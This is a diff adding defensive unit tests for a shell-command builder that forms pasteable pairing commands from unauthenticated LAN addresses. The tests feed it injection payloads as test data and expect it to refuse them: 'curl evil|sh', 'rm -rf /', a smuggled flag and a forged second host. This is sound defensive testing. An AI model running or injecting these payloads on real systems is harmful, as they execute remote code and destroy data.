@@ -102,3 +102,39 @@ test('the troubleshooting host is the first of the same list', () => {
   const addresses = ['10.10.10.9', '192.168.68.68'];
   expect(bestAddress(addresses)).toBe(dialableAddresses(addresses)[0]);
 });
+
+// ── This line is pasted into a shell on a machine someone just walked to, and
+// the control page is served over plain http on a LAN, so the socket feeding
+// these addresses is not authenticated. Each case below rendered a complete,
+// pasteable command before.
+
+test('a shell metacharacter never reaches the pasted line', () => {
+  expect(joinCommand({ code: 'ABC123', addresses: ['10.0.0.5;curl evil|sh'] })).toBe('');
+  expect(joinCommand({ code: 'ABC123', addresses: ['10.0.0.5 --unsafe'] })).toBe('');
+  expect(joinCommand({ code: 'A;rm -rf /', addresses: ['10.0.0.5'] })).toBe('');
+});
+
+test('a non-string address is dropped, not coerced to [object Object]', () => {
+  // Node addresses ARE objects elsewhere in this protocol, so one shape drift
+  // would otherwise ship a command that looks pasteable and cannot work.
+  expect(dialableAddresses([{ addr: '10.0.0.5' }])).toEqual([]);
+  expect(dialableAddresses([null, undefined, 42, '10.0.0.5'])).toEqual(['10.0.0.5']);
+});
+
+test('a comma inside a host cannot forge a second host', () => {
+  expect(dialableAddresses(['10.0.0.5,evil.example'])).toEqual([]);
+});
+
+test('every spelling of loopback is refused, not just 127.0.0.1', () => {
+  // Each installs cleanly and then fails to pair — the most confusing
+  // failure available here, per this module's own header.
+  for (const a of ['localhost', 'localhost:8443', '[::1]:8443', '::1',
+                   '::ffff:127.0.0.1', '0:0:0:0:0:0:0:1', '127.0.1.1']) {
+    expect(dialableAddresses([a])).toEqual([]);
+  }
+});
+
+test('the forms an operator actually needs still render', () => {
+  expect(dialableAddresses(['10.10.10.9', '[fe80::1]:34334', 'spark-256a', 'host:9000']))
+    .toEqual(['10.10.10.9', '[fe80::1]:34334', 'spark-256a', 'host:9000']);
+});
